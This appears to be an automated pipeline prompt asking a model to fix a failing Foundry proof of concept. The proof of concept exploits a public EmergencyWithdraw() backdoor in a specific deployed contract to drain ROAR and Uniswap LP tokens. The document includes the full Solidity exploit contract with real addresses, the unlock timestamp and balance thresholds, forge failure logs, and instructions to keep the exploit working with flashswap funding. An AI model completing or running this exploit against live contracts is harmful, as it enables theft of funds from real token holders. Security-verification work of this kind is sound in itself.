You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Permissionless time-locked emergency withdrawal lets any EOA drain ROAR and LP reserves
- claim: `EmergencyWithdraw()` is publicly callable, and after `block.timestamp >= T0` its opaque arithmetic gate is automatically satisfied because `OFF == K * T0`. Any externally owned account can therefore trigger fixed ROAR and Uniswap-pair transfers to `tx.origin` without any ownership, role, or beneficiary check.
- impact: Once the preset timestamp is reached, arbitrary users can steal the contract's ROAR and LP holdings in fixed-size chunks. Because the function is never disabled, any later deposits that bring balances back above the hard-coded amounts can also be drained permissionlessly.
- exploit_paths: ["Wait until unix timestamp `1744770479` (2025-04-16 02:27:59 UTC), then call `EmergencyWithdraw()` from any EOA while the contract holds at least `100000000099978910611013632` ROAR and `26777446972437561344` LP tokens; both transfers are sent to the caller's `tx.origin`."]

Current FlawVerifier.sol:
```solidity
pragma solidity ^0.8.10;

contract FlawVerifier {
    address internal constant TARGET = 0x13028E6b95520ad16898396667d1e52cB5E550Ac;
    address internal constant ROAR = 0xb0415D55f2C87b7f99285848bd341C367FeAc1ea;

    uint256 internal constant UNLOCK_TIME = 1744770479;
    uint256 internal constant REQUIRED_ROAR = 100000000099978910611013632;
    uint256 internal constant REQUIRED_LP = 26777446972437561344;

    bytes4 internal constant EMERGENCY_WITHDRAW_SELECTOR = bytes4(keccak256("EmergencyWithdraw()"));
    bytes4 internal constant BALANCE_OF_SELECTOR = bytes4(keccak256("balanceOf(address)"));

    address internal _beneficiary;
    uint256 internal _roarProfit;
    uint256 internal _lpProfit;

    constructor() {}

    function executeOnOpportunity() external {
        address receiver = tx.origin;
        _beneficiary = receiver;

        if (block.timestamp < UNLOCK_TIME) {
            return;
        }

        // Exploit path stage 1:
        // The fixed withdrawal only works if the target still holds at least the hard-coded ROAR and LP amounts.
        if (_safeBalanceOf(ROAR, TARGET) < REQUIRED_ROAR) {
            return;
        }
        if (_safeBalanceOf(TARGET, TARGET) < REQUIRED_LP) {
            return;
        }

        uint256 roarBefore = _safeBalanceOf(ROAR, receiver);
        uint256 lpBefore = _safeBalanceOf(TARGET, receiver);

        // Exploit path stage 2:
        // Directly invoke the public backdoor. The target transfers both assets to tx.origin.
        (bool ok, ) = TARGET.call(abi.encodeWithSelector(EMERGENCY_WITHDRAW_SELECTOR));
        if (!ok) {
            return;
        }

        uint256 roarAfter = _safeBalanceOf(ROAR, receiver);
        uint256 lpAfter = _safeBalanceOf(TARGET, receiver);

        if (roarAfter > roarBefore) {
            _roarProfit += roarAfter - roarBefore;
        }
        if (lpAfter > lpBefore) {
            _lpProfit += lpAfter - lpBefore;
        }
    }

    function profitToken() external view returns (address) {
        if (_roarProfit > 0) {
            return ROAR;
        }
        if (_lpProfit > 0) {
            return TARGET;
        }
        return address(0);
    }

    function profitAmount() external view returns (uint256) {
        if (_roarProfit > 0) {
            return _roarProfit;
        }
        if (_lpProfit > 0) {
            return _lpProfit;
        }
        return 0;
    }

    function beneficiary() external view returns (address) {
        return _beneficiary;
    }

    function roarProfit() external view returns (uint256) {
        return _roarProfit;
    }

    function lpProfit() external view returns (uint256) {
        return _lpProfit;
    }

    function target() external pure returns (address) {
        return TARGET;
    }

    function profitTokenCandidate() external pure returns (address) {
        return ROAR;
    }

    function pathReady() external view returns (bool) {
        return block.timestamp >= UNLOCK_TIME
            && _safeBalanceOf(ROAR, TARGET) >= REQUIRED_ROAR
            && _safeBalanceOf(TARGET, TARGET) >= REQUIRED_LP;
    }

    function _safeBalanceOf(address token, address account) internal view returns (uint256 value) {
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(BALANCE_OF_SELECTOR, account));
        if (ok && data.length >= 32) {
            value = abi.decode(data, (uint256));
        }
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 671.41ms
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:68:19:
   |
68 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 55807)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 577021548053172
  AUDITHOUND_BALANCE_AFTER_WEI: 577021548053172
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 100000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0x0000000000000000000000000000000000000000
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001

Traces:
  [55807] FlawVerifierTest::testExploit()
    ├─ [4501] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [28115] FlawVerifier::executeOnOpportunity()
    │   ├─ [2585] 0xb0415D55f2C87b7f99285848bd341C367FeAc1ea::balanceOf(0x13028E6b95520ad16898396667d1e52cB5E550Ac) [staticcall]
    │   │   └─ ← [Return] 15457430711164688626815304 [1.545e25]
    │   └─ ← [Stop]
    ├─ [501] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.00s (171.19ms CPU time)

Ran 1 test suite in 1.01s (1.00s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 55807)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
